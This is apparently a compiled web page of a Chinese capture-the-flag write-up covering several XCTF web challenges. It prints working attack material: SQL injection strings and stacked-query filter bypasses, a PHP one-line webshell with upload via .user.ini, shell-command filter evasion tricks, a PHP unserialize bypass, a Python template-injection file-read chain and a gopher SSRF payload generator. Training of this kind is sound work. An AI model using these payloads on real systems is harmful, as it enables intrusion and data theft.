import{_ as o,V as p,W as c,X as s,Y as n,$ as e,a0 as t,y as l}from"./framework.11bf0923.js";const i="/images/攻防世界-inget.png",u="/images/xctf-easyupload.png",r="/images/easyupload-1.png",d="/images/easyupload-2.png",k="/images/easyupload-3.png",_="/images/easyupload-4.png",m="/images/easyupload-5.png",h="/images/easyupload-6.png",g={},b=s("h1",{id:"攻防世界刷题记录",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#攻防世界刷题记录","aria-hidden":"true"},"#"),n(" 攻防世界刷题记录")],-1),v={id:"inget",tabindex:"-1"},f=s("a",{class:"header-anchor",href:"#inget","aria-hidden":"true"},"#",-1),y={href:"https://adworld.xctf.org.cn/challenges/details?hash=c178eac4-1625-11ed-abf3-fa163e4fa609&task_category_id=3",target:"_blank",rel:"noopener noreferrer"},q=t('<p><img src="'+i+`" alt="页面提示" loading="lazy"></p><p>由页面提示<code>Please enter ID,and Try to bypass</code>可知需要传一个名为id的请求参数，如下所示：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://223.112.5.156:55115/?id=1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>绕过id就可能存在sql注入，尝试<code>id=1&#39; and 1=1</code>和<code>id=1&#39; and 1=2</code>看页面是否会有变化。经过多次尝试发现<code>id=1&#39; or 1=1</code>可以成功获得<code>flag</code>。可能的sql语句为：</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> nice<span class="token punctuation">,</span> flag <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">&#39;xxxx$id&#39;</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>无论id是什么都无法从数据表中查询到内容，故用or构造一个真值绕过。找到注入点后可以继续使用<code>order by</code>猜解列名，<code>uinon</code>爆出数据库、操作系统等信息。</p>`,6),x={id:"easyupload",tabindex:"-1"},w=s("a",{class:"header-anchor",href:"#easyupload","aria-hidden":"true"},"#",-1),z={href:"https://adworld.xctf.org.cn/challenges/details?hash=50df7052-1626-11ed-9827-fa163e4fa633&task_category_id=3",target:"_blank",rel:"noopener noreferrer"},$=t('<p><img src="'+u+'" alt="页面提示" loading="lazy"> 直接上传php一句话提示<code>Your file looks wicked</code>，说明对上传文件的类型做了限制。bp抓包修改文件名和Content-Type仍然提示<code>Your file looks wicked</code>，说明还有其他的限制。经过一番探索，发现对上传文件的内容也做了限制且文件解析需要包含文件的路径。</p><ol><li>上传<code>.user.ini</code>解析一句话木马的路径<br><img src="'+r+'" alt="上传.user.ini" loading="lazy"></li><li>上传一句话木马 <img src="'+d+'" alt="上传一句话木马" loading="lazy"></li><li>中国蚁剑连接<br><img src="'+k+`" alt="蚁剑连接" loading="lazy"><br> 蚁剑连接后可以在根目录找到flag文件。<br> 此外，一句话木马还可以写成</li></ol><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;cmd&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+_+'" alt="上传一句话木马" loading="lazy"><br> 执行命令<code>ls ../../</code>即可找到flag文件。<br><img src="'+m+'" alt="result" loading="lazy"><br> 执行命令<code>cat ../../flag</code>查看文件内容。<br><img src="'+h+'" alt="result" loading="lazy"></p>',4),E={id:"unseping",tabindex:"-1"},T=s("a",{class:"header-anchor",href:"#unseping","aria-hidden":"true"},"#",-1),I={href:"https://adworld.xctf.org.cn/challenges/details?hash=3714626e-3a5b-11ed-abf3-fa163e4fa609&task_category_id=3",target:"_blank",rel:"noopener noreferrer"},S=t('<div class="custom-container tip"><p class="custom-container-title">提示</p><ol><li>Linux上如果shell是bash，空格使用<code>${IFS}</code>或者<code>$IFS$9</code>绕过</li><li><code>&#39;&#39;</code>或者<code>&quot;&quot;</code>用来作命令替换，执行括号或者反引号中的命令</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>l<span class="token string">&#39;&#39;</span>s<span class="token variable">${<span class="token environment constant">IFS</span>}</span><span class="token parameter variable">-l</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ol start="3"><li>printf绕过<code>/</code>: <code>$(printf${IFS}&quot;\\57&quot;)</code>,<code>$()</code>表示执行命令</li></ol></div>',1),A={id:"web-php-unserialize",tabindex:"-1"},C=s("a",{class:"header-anchor",href:"#web-php-unserialize","aria-hidden":"true"},"#",-1),P={href:"https://adworld.xctf.org.cn/challenges/details?hash=a96b6abc-21b4-4814-afcd-8c32ddc1d631_2&task_category_id=3",target:"_blank",rel:"noopener noreferrer"},V=s("div",{class:"custom-container tip"},[s("p",{class:"custom-container-title"},"提示"),s("ol",null,[s("li",null,[n("更改序列化成员数绕过"),s("code",null,"__wakeup")]),s("li",null,[s("code",null,"O:4"),n("到"),s("code",null,"O:+4"),n("绕过"),s("code",null,"/[oc]:\\d+:/i"),n("正则匹配")])])],-1),j={id:"supersqli",tabindex:"-1"},F=s("a",{class:"header-anchor",href:"#supersqli","aria-hidden":"true"},"#",-1),L={href:"https://adworld.xctf.org.cn/challenges/details?hash=279780af-0dcb-4a1c-b8d3-fd0410115df9_2&task_category_id=3",target:"_blank",rel:"noopener noreferrer"},N=t(`<div class="custom-container tip"><p class="custom-container-title">提示</p><ol><li>sql多语句执行。</li></ol><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">use</span> xxx<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span><span class="token keyword">show</span> databses<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ol start="2"><li>预处理是sql执行方式。</li></ol><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token number">1.</span> <span class="token keyword">set</span> <span class="token variable">@sql</span><span class="token operator">=</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">;</span> <span class="token comment"># 定义sql语句</span>
<span class="token number">2.</span> <span class="token keyword">PREPARE</span> pre <span class="token keyword">from</span> <span class="token variable">@sql</span><span class="token punctuation">;</span> <span class="token comment"># 准备sql语句</span>
<span class="token number">3.</span> <span class="token keyword">EXECUTE</span> pre<span class="token punctuation">;</span> <span class="token comment"># 执行sql语句</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="3"><li><code>concat</code>绕过关键字过滤。</li></ol><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">set</span> <span class="token variable">@sql</span><span class="token operator">=</span>concat<span class="token punctuation">(</span><span class="token string">&#39;s&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;elect * from xxx&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></div>`,1),B={id:"web-python-template-injection",tabindex:"-1"},O=s("a",{class:"header-anchor",href:"#web-python-template-injection","aria-hidden":"true"},"#",-1),W={href:"https://adworld.xctf.org.cn/challenges/details?hash=8fe14e15-d91a-4557-a1b0-301700d3d25c_2&task_category_id=3",target:"_blank",rel:"noopener noreferrer"},Y=t(`<div class="custom-container tip"><p class="custom-container-title">提示</p><ol><li>模版语法<code>{{}}</code></li><li>通过继承链调用方法</li></ol><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__ <span class="token comment"># &#39;&#39;所属的类</span>
<span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__ <span class="token comment"># 类的继承链</span>
<span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># object类的所有子类</span>
<span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">&#39;os&#39;</span><span class="token punctuation">]</span> <span class="token comment"># os模块</span>
<span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">&#39;os&#39;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">&#39;./&#39;</span><span class="token punctuation">)</span> <span class="token comment"># 读取当前目录下的所有文件</span>

<span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token comment"># 文件读取模块</span>
<span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#39;xxx&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 读取文件内容</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="3"><li>url_for.<strong>globals</strong></li><li><code>{{&#39;&#39;[request.args.a]}}?a=__class__ </code> 用于绕过关键字检测</li></ol><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token operator">/</span>register<span class="token punctuation">.</span>php<span class="token operator">/</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">&#39;&#39;</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>c<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#39;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;</span><span class="token punctuation">)</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>d<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>?a<span class="token operator">=</span>__class__<span class="token operator">&amp;</span>b<span class="token operator">=</span>__mro__<span class="token operator">&amp;</span>c<span class="token operator">=</span>__subclasses__<span class="token operator">&amp;</span>d<span class="token operator">=</span>read
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></div>`,1),D={id:"very-easy-sql",tabindex:"-1"},H=s("a",{class:"header-anchor",href:"#very-easy-sql","aria-hidden":"true"},"#",-1),R={href:"https://adworld.xctf.org.cn/challenges/details?hash=054646ec-17ad-11ed-abf3-fa163e4fa609&task_category_id=3",target:"_blank",rel:"noopener noreferrer"},U=t(`<div class="custom-container tip"><p class="custom-container-title">提示</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse

host <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1:80&quot;</span>
content <span class="token operator">=</span> <span class="token string">&quot;uname=admin&amp;passwd=admin&quot;</span>
content_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>

test <span class="token operator">=</span>\\
<span class="token triple-quoted-string string">&quot;&quot;&quot;POST /index.php HTTP/1.1
Host: {}
User-Agent: curl/7.43.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}
&quot;&quot;&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>content_length<span class="token punctuation">,</span>content<span class="token punctuation">)</span>

tmp <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>test<span class="token punctuation">)</span> 
new <span class="token operator">=</span> tmp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;%0A&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;%0D%0A&quot;</span><span class="token punctuation">)</span>
result <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>new<span class="token punctuation">)</span> 
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;gopher://&quot;</span><span class="token operator">+</span>host<span class="token operator">+</span><span class="token string">&quot;/_&quot;</span><span class="token operator">+</span>result<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></div><h2 id="shrine" tabindex="-1"><a class="header-anchor" href="#shrine" aria-hidden="true">#</a> shrine</h2>`,2),X={href:"https://www.anquanke.com/post/id/246094",target:"_blank",rel:"noopener noreferrer"};function G(J,K){const a=l("ExternalLinkIcon");return p(),c("div",null,[b,s("h2",v,[f,n(),s("a",y,[n("inget"),e(a)])]),q,s("h2",x,[w,n(),s("a",z,[n("easyupload"),e(a)])]),$,s("h2",E,[T,n(),s("a",I,[n("unseping"),e(a)])]),S,s("h2",A,[C,n(),s("a",P,[n("Web_php_unserialize"),e(a)])]),V,s("h2",j,[F,n(),s("a",L,[n("supersqli"),e(a)])]),N,s("h2",B,[O,n(),s("a",W,[n("Web_python_template_injection"),e(a)])]),Y,s("h2",D,[H,n(),s("a",R,[n("very_easy_sql"),e(a)])]),U,s("p",null,[s("a",X,[n("python模版注入相关"),e(a)])])])}const Q=o(g,[["render",G],["__file","攻防世界刷题记录.html.vue"]]);export{Q as default};
